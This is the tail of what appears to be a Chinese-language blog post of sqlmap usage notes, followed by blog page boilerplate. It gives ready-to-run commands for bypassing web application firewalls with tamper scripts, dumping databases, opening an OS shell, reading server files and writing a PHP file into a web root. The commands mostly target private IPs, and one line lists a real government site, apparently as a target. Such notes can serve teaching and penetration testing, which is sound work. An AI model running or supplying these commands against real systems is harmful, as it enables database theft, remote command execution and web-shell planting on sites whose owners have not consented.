+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">waf绕过技术（利用tamper脚本）<br>注入点:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">159.1</span>/news.php?id=<span class="hljs-number">1</span><br>sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">159.1</span>/news.php?id=<span class="hljs-number">1</span> -v <span class="hljs-number">3</span> --dbs  --batch --tamper <span class="hljs-string">&quot;space2morehash.py&quot;</span><br>space2hash.py   base64encode.py charencode.py<br><br>sqlmap -u http:<span class="hljs-regexp">//</span>ha.cker.<span class="hljs-keyword">in</span>/index.php?tel=LTEnIG9yICc4OCc9Jzg5 --tamper base64encode.py –dbs<br>http:<span class="hljs-regexp">//</span>lm.yichang.gov.cn/<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-comment">--dump的使用</span><br>数据库导出<br></code></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">命令执行<br>参数：--os-<span class="hljs-keyword">cmd</span><span class="bash"> <span class="hljs-string">&quot;ipconfig&quot;</span>,--os-shell</span><br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。<br><span class="hljs-keyword">cmd</span><span class="bash">			执行cmd命令（win）</span><br><span class="hljs-keyword">shell</span><span class="bash">			执行当前用户命令 </span><br>--os-<span class="hljs-keyword">shell</span><br><span class="bash">自动上传 脚本文件</span><br>返回<span class="hljs-keyword">shell</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">--smart</span><br>有时对目标非常多的<span class="hljs-built_in">URL</span>进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。<br>例子：<br>$ python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;</span> <span class="hljs-comment">--batch --smart</span><br><br><br></code></pre></td></tr></table></figure>
+<p><strong>特殊情况（MYSQL数据库版本小于5.0）</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">暴力破解表名<br>参数：<span class="hljs-comment">--common-tables</span><br>当使用<span class="hljs-comment">--tables无法获取到数据库的表时，可以使用此参数。</span><br>通常是如下情况：<br><span class="hljs-number">1</span>、MySQL数据库版本小于<span class="hljs-number">5.0</span>，没有information_schema表。<br><span class="hljs-number">2</span>、数据库是Microssoft <span class="hljs-keyword">Access</span>，系统表MSysObjects是不可读的（默认）。<br><span class="hljs-number">3</span>、当前用户没有权限读取系统中保存数据结构的表的权限。<br>暴力破解的表在txt/common-<span class="hljs-keyword">tables</span>.txt文件中，你可以自己添加。<br><br>Xx  <span class="hljs-comment">--common-tables -D testdb</span><br><br>暴力破解列名<br>参数：<span class="hljs-comment">--common-columns</span><br>与暴力破解表名一样，暴力跑的列名在txt/common-<span class="hljs-keyword">columns</span>.txt中。<br><br><br>Xx  <span class="hljs-comment">--common-columns  -T text -D testdb</span><br><br></code></pre></td></tr></table></figure>
+<p>延迟注入：</p>
+<p>–time-sec</p>
+<h3 id="文件读写及上传"><a href="#文件读写及上传" class="headerlink" title="文件读写及上传"></a>文件读写及上传</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">从数据库服务器中读取文件<br>参数：--<span class="hljs-keyword">file</span>-<span class="hljs-keyword">read</span><br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。<br><br>sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-comment">&quot;http://192.168.2.3:81/about/show.php</span><br>?lang=<span class="hljs-keyword">cn</span>&amp;id=<span class="hljs-number">22</span><span class="hljs-string">&quot; --file-read=&quot;</span>C:\Inetpub\wwwroot\mysql-php\<span class="hljs-number">1</span>.php<span class="hljs-comment">&quot;</span><br><br>文件上传<br>参数：--<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>,--<span class="hljs-keyword">file</span>-dest<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。<br><br>sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.2.129/article.php?id=5&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>=<span class="hljs-string">&quot;C:\1.php&quot;</span> --<span class="hljs-keyword">file</span>-dest=<span class="hljs-string">&quot;/var/www/html/x.php&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/sqlmap/">sqlmap</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/01/HTML%E5%9F%BA%E7%A1%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTML基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/01/ssh%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%94%BB%E9%98%B2/">
+                        <span class="hidden-mobile">SSH攻防学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
